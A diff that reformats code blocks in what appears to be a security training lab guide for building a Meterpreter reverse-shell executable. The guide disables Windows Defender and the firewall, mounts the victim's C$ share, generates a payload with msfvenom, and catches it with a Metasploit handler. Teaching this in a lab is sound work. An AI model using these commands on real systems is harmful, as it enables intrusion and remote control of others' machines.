@@ -200,7 +200,9 @@ Let’s begin by disabling **Defender**. Simply run the following from an **Admi
 
 Next, run the following command in the **Powershell** terminal:
 
-<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
+```ps
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 <img width="786" height="223" alt="image" src="https://github.com/user-attachments/assets/def5f9b6-22c7-4278-9b37-fbfb5af3a02e" />
 
@@ -210,18 +212,24 @@ If you get angry red errors, that is **Ok**, it means **Defender** is not runnin
 
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
-<pre> netsh advfirewall set allprofiles state off</pre>
+```cmd
+netsh advfirewall set allprofiles state off
+```
 
 
 Next, set a password for the Administrator account that you can remember
 
-<pre>net user Administrator password1234</pre>
+```bash
+net user Administrator password1234
+```
 
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
 Before we move on from our Powershell window, lets get our IP by running the following command:
 
-<pre>ipconfig</pre>
+```cmd
+ipconfig
+```
 
 
 **REMEMBER - YOUR IP WILL BE DIFFERENT**
@@ -237,9 +245,13 @@ Alternatively, you can click on the **Kali** icon in the taskbar.
 
 We need to run the following commands in order to mount our remote system to the correct directory:
 
-<pre>sudo su -</pre>
+```bash
+sudo su -
+```
 
-<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
+```bash
+mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234
+```
 
 **REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
 
@@ -247,14 +259,18 @@ We need to run the following commands in order to mount our remote system to the
 
 Run the following command to navigate into the mounted directory:
 
-<pre>cd /mnt/windows-share</pre>
+```bash
+cd /mnt/windows-share
+```
 
 <img width="645" height="251" alt="image" src="https://github.com/user-attachments/assets/b3a98a1f-559f-46b3-8967-88457212d1ee" />
 
 
 Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
 
-<pre>ifconfig</pre>
+```bash
+ifconfig
+```
 
 <img width="660" height="419" alt="image" src="https://github.com/user-attachments/assets/d88c93b2-c80f-4a88-ba71-3e82cbcf20a2" />
 
@@ -263,7 +279,9 @@ Before we run the next commands, we need to get the IP of our Kali System (AKA o
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
-<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+```bash
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe
+```
 
 <img width="646" height="148" alt="image" src="https://github.com/user-attachments/assets/d84a0070-9c3f-47cb-b1b4-ea447ddbdeef" />
 
@@ -276,23 +294,35 @@ Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clickin
 
 Let's become root.
 
-<pre>sudo su -</pre>
+```bash
+sudo su -
+```
 
 Now let's start the **Metasploit** Handler
 
-<pre>msfconsole -q</pre>
+```bash
+msfconsole -q
+```
 
 We are going to run the following commands to correctly set the parameters:
 
-<pre>use exploit/multi/handler</pre>
+```bash
+use exploit/multi/handler
+```
 
-<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
 
-<pre>set LHOST [Your Linux IP Address]</pre>
+```bash
+set LHOST [Your Linux IP Address]
+```
 
 Remember, **Your IP will be different!**
 
-<pre>exploit</pre>
+```bash
+exploit
+```
 
 It should look like this:
 
@@ -307,11 +337,15 @@ We will need to open a **"cmd.exe"** terminal as **Administrator**.
 
 let's run the following commands to run the **"TrustMe.exe"** file.
 
-<pre>cd \</pre>
+```bash
+cd \
+```
  
 Then run it with the following:
 
- <pre>TrustMe.exe</pre>
+```bash
+TrustMe.exe
+```
 
 Back at your Kali terminal, you should have a metasploit session!
 
